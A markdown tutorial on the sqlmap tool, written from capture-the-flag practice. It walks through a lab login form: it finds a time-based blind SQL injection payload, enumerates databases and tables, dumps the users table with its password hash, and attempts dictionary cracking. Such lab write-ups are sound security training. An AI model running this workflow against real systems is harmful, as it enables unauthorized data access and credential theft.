# sqlmap

- [Introduction](#introduction)
- [Usage](#usage)
- [Examples](#examples)

## Introduction

The sqlmap tool makes sql injection and detection very trivial. I use this tool in capture the flag events to dump sql tables and get information. This tool also detects and reports what database management system is being used. Until recently, injection and sql injection has been the top vulnerability in the OWASP Top 10 list. This tool makes it easy to detect and fix sql injection.

## Usage

```bash
$ sqlmap -h
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.4.4#stable}
|_ -| . [,]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

Usage: python3 sqlmap [options]

Options:
  -h, --help            Show basic help message and exit
  -hh                   Show advanced help message and exit
  --version             Show program's version number and exit
  -v VERBOSE            Verbosity level: 0-6 (default 1)

  Target:
    At least one of these options has to be provided to define the
    target(s)

    -u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")
    -g GOOGLEDORK       Process Google dork results as target URLs

  Request:
    These options can be used to specify how to connect to the target URL

    --data=DATA         Data string to be sent through POST (e.g. "id=1")
    --cookie=COOKIE     HTTP Cookie header value (e.g. "PHPSESSID=a8d127e..")
    --random-agent      Use randomly selected HTTP User-Agent header value
    --proxy=PROXY       Use a proxy to connect to the target URL
    --tor               Use Tor anonymity network
    --check-tor         Check to see if Tor is used properly

  Injection:
    These options can be used to specify which parameters to test for,
    provide custom injection payloads and optional tampering scripts

    -p TESTPARAMETER    Testable parameter(s)
    --dbms=DBMS         Force back-end DBMS to provided value

  Detection:
    These options can be used to customize the detection phase

    --level=LEVEL       Level of tests to perform (1-5, default 1)
    --risk=RISK         Risk of tests to perform (1-3, default 1)

  Techniques:
    These options can be used to tweak testing of specific SQL injection
    techniques

    --technique=TECH..  SQL injection techniques to use (default "BEUSTQ")

  Enumeration:
    These options can be used to enumerate the back-end database
    management system information, structure and data contained in the
    tables

    -a, --all           Retrieve everything
    -b, --banner        Retrieve DBMS banner
    --current-user      Retrieve DBMS current user
    --current-db        Retrieve DBMS current database
    --passwords         Enumerate DBMS users password hashes
    --tables            Enumerate DBMS database tables
    --columns           Enumerate DBMS database table columns
    --schema            Enumerate DBMS schema
    --dump              Dump DBMS database table entries
    --dump-all          Dump all DBMS databases tables entries
    -D DB               DBMS database to enumerate
    -T TBL              DBMS database table(s) to enumerate
    -C COL              DBMS database table column(s) to enumerate

  Operating system access:
    These options can be used to access the back-end database management
    system underlying operating system

    --os-shell          Prompt for an interactive operating system shell
    --os-pwn            Prompt for an OOB shell, Meterpreter or VNC

  General:
    These options can be used to set some general working parameters

    --batch             Never ask for user input, use the default behavior
    --flush-session     Flush session files for current target

  Miscellaneous:
    These options do not fit into any other category

    --sqlmap-shell      Prompt for an interactive sqlmap shell
    --wizard            Simple wizard interface for beginner users

[!] to see full list of options run with '-hh'
```

## Examples

The sqlmap tool if really effective at testing forms to see if one of the parameters is vulnerable to sql injection. A typical use case for sqlmap is to find a form, capture a request for it and then hand that request to sqlmap. The sqlmap tool will check each parameter to see if they are vulnerable. If any of the parameters are vulnerable, it will get different data. At each step, we'll use the data from the previous step to get more data. Eventually an entire database can be dumped using this tool. Here are the steps that are used:

- Find a form.
- Capture a submission request to that form.
- Hand that request to sqlmap.
- If sqlmap determines that any parameter is vulnerable, exploit that vulnerablity.
- Get all database names.
- Get all table names.
- Get table structure for each table.
- Get dump of each table.

### With Sample Request

When I see a login form and I want to test if it vulnerable to a sql injection attack, I'll capture a login request using the developer toolbar or Burp. I'll copy that request to a file and name it `request.txt`. The sqlmap tool will take care of the rest. Here is a sample request that I have saved in the `request.txt` file:

```text
POST /api/login HTTP/1.1
Host: 10.10.191.223
Content-Length: 32
Cache-Control: max-age=0
Accept-Language: en-GB,en;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: http://target.thm
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

username=admin&password=password
```

Now running the following command will check if this form is vulnerable to a sql injection attack:

```bash
$ sqlmap -r request.txt
...
[04:55:26] [INFO] checking if the injection point on POST parameter 'username' is a false positive
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
sqlmap identified the following injection point(s) with a total of 158 HTTP(s) requests:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND (SELECT 6950 FROM (SELECT(SLEEP(5)))pDlF) AND 'Rvtz'='Rvtz&password=password
---
[04:55:47] [INFO] the back-end DBMS is MySQL
```

The sqlmap tool will examine the request and check each parameter being sent in the request. For this example it will check if username is vulnerable to a sql injection attack then it will run the same test for the password parameter. It tests the parameters by checking if it can get a timeout for the request. It will add a delay of like five seconds to each parameter request and if the response takes more than five seconds, it will know that the parameter is vulnerable to the attack and what type of database the site is using.

As mentioned before, the username parameter is vulnerable and the backend is MySQL.

### Getting Databases

Now that I know that the username parameter is vulnerable, I can start to get useful information. First, I need to know what databases are in this instance of MySQL. I run the following command:

```bash
$ sqlmap -r request.txt --dbs
...
available databases [2]:
[*] gallery_db
[*] information_schema
```

### Getting Tables for a Database

There are two databases, I can now select a database and get all the tables for that database. In my example, I only care about the gallery database. So I run the following command to get all the tables in the `gallery_db` database:

```bash
$ sqlmap -r request.txt -D gallery_db --tables
...
Database: gallery_db
[4 tables]
+-------------+
| album_list  |
| images      |
| system_info |
| users       |
+-------------+
```

### Getting Columns for a Table

Looking at the list, users is the table that I want to start pulling data from. I'll wager that I don't need most of the columns for this table. I am going to get the columns for the users table by running the following command:

```bash
$ sqlmap -r request.txt -D gallery_db -T users --columns
...
Database: gallery_db
Table: users
[10 columns]
+--------------+--------------+
| Column       | Type         |
+--------------+--------------+
| id           | int(50)      |
| password     | text         |
| type         | tinyint(1)   |
| avatar       | text         |
| date_added   | datetime     |
| date_updated | datetime     |
| firstname    | varchar(250) |
| last_login   | datetime     |
| lastname     | varchar(250) |
| username     | text         |
+--------------+--------------+
```

### Getting Records for a Table

Now I can get records for the users table. If I don't want to filter the columns I can run the following:

```bash
$ sqlmap -r request.txt -D gallery_db -T users --dump
```

This will dump data for all columns in the table. This can be very slow for tables with a lot of columns or a lot of records.

### Getting Filtered Column Records for a Table

In my case I want to filter it. This is because it will ask yes or no questions over and over to get each character of data. That takes a lot of time and I want to speed things up. Here is the command I run to filter the columns that I want for each record:

```bash
$ sqlmap -r request.txt -D gallery_db -T users -C firstname,username,password --dump
...
Database: gallery_db
Table: users
[1 entry]
+--------------+----------------------------------+----------+
| firstname    | password                         | username |
+--------------+----------------------------------+----------+
| Adminstrator | a228b12a08b6527e7978cbe5d914531c | admin    |
+--------------+----------------------------------+----------+
```

### Cracking Password Hashes

In the previous output sqlmap noticed that the password value was a hash and so it asked if I wanted to have it try to crack the hash. This is optional and so I could have skipped it but I ran it to show an example. If it was able to crack the hash, it would have output the value. Here is the output:

```bash
[05:26:29] [INFO] adjusting time delay to 1 second due to good response times
a228b12a08b6527e7978cbe5d914531c
[05:28:11] [INFO] retrieved: Adminstrator
[05:28:48] [INFO] retrieved: admin
[05:29:02] [INFO] recognized possible password hashes in column '`password`'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] 
do you want to crack them via a dictionary-based attack? [Y/n/q] 
[05:29:20] [INFO] using hash method 'md5_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 
[05:29:23] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] 
[05:29:25] [INFO] starting dictionary-based cracking (md5_generic_passwd)
[05:29:25] [INFO] starting 2 processes 
[05:29:56] [WARNING] no clear password(s) found
```










